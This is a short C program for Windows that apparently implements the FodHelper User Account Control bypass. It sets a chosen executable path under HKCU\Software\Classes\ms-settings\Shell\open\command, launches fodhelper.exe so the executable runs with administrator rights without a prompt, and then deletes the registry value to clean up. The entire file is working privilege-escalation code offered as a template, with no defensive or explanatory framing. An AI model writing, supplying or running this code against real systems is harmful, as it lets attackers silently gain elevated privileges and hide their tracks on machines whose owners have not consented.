#include <windows.h>
#include <stdio.h>

// Function to modify the registry
int set_registry_value(const char* keyPath, const char* valueName, const char* valueData) {
    HKEY hKey;
    // Open the registry key for modification
    if (RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return 0;
    }

    // Set the value in the registry
    if (RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)valueData, strlen(valueData) + 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 0;
    }

    // Close the registry key
    RegCloseKey(hKey);
    return 1;
}

// Function to delete a registry value
int delete_registry_value(const char* keyPath, const char* valueName) {
    HKEY hKey;
    // Open the registry key for deletion
    if (RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return 0;
    }

    // Delete the registry value
    if (RegDeleteValue(hKey, valueName) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return 0;
    }

    // Close the registry key
    RegCloseKey(hKey);
    return 1;
}

int main() {
    // The registry key and value that FodHelper.exe uses
    const char* keyPath = "Software\\Classes\\ms-settings\\Shell\\open\\command";
    const char* valueName = "";  // Default value

    // The executable you want to run with elevated privileges
    const char* exePath = "C:\\path\\to\\your\\file.exe";

    // Backup original registry value (optional, could restore afterward if needed)

    // Set the registry value to point to our executable
    if (!set_registry_value(keyPath, valueName, exePath)) {
        printf("Failed to modify registry.\n");
        return 1;
    }

    printf("Registry modified successfully, executing FodHelper.exe...\n");

    // Add a delay before execution (e.g., 2 seconds)
    Sleep(2000);

    // Execute FodHelper.exe, which should now run our executable with admin privileges
    system("C:\\Windows\\System32\\fodhelper.exe");

    // Add another delay (e.g., 5 seconds) before cleanup
    Sleep(5000);

    // Clean up the registry by deleting the modified value
    if (!delete_registry_value(keyPath, valueName)) {
        printf("Failed to clean up the registry.\n");
        return 1;
    }

    printf("Registry cleaned up successfully.\n");

    return 0;
}
